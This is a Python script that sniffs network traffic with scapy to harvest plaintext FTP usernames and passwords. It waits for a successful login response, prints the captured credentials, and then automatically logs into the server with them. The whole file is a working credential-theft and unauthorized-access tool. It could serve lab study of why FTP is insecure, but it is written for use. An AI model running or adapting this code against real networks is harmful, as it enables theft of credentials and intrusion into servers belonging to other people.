import sys
import yaml
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
from scapy.all import *

currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir) 
from ftp import ftp_client

# get config variables
with open(os.path.join((os.path.sep).join(os.path.realpath(__file__).split(os.path.sep)[:-1]), "config.yml"), "r") as ymlfile:
    config = yaml.safe_load(ymlfile)
interface = str(config['interface'])
ftp_port = int(config['ftp_port'])

# initialise user / pass lists
usernames = ["No usernames yet"]
passwords = ["No passwords yet"]
hostnames = ["No hostnames yet"]

# check for a 230 response packet
def check_login(pkt, username, password, hostname):
    try:
        if b'230' in pkt[Raw].load:
            print('[*] Valid Credentials Found')
            print(f"[*] {str(pkt[IP].dst).strip()} -> {str(pkt[IP].src).strip()}")
            print(f"[*] Username: {username}")
            print(f"[*] Password: {password}\n")

            # Try to connect to ftp after sniffing.
            ftp_client(hostname=hostname, port=ftp_port, user=username, passwd=password)
            # This true means that the sniff stop_filter condition is met and stops sniffing.
            return True
        else:
            return False
    except Exception:
        return

# checking for ftp 
def check_for_ftp(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        if pkt[TCP].dport == ftp_port or pkt[TCP].sport == ftp_port:
            return True
        else:
            return False
    else:
        return False

def check_pkt(pkt):
    if check_for_ftp(pkt):
        pass
    else:
        return

    data = pkt[Raw].load.decode('utf-8')
    hostnames.append(str(pkt[IP].src).strip())
    if 'USER' in data:
        usernames.append(data.split('USER ')[1].strip())
    elif 'PASS' in data:
        passwords.append(data.split('PASS ')[1].strip())
    else:
        # if ftp login is attempted with stolen creds then true is returned and
        # sniffing stops.
        return check_login(pkt, usernames[-1], passwords[-1], hostnames[-1])
    return

if __name__ == '__main__':
    print(f'[*] Sniffing Started on {interface}...\n')
    # try:
    output = sniff(iface=interface, stop_filter=check_pkt, store=0)
    # except Exception:
    #     print('[!] Error: Failed to initialize sniffing')
    #     sys.exit(1)
    print('\n[*] Sniffing Stopped')



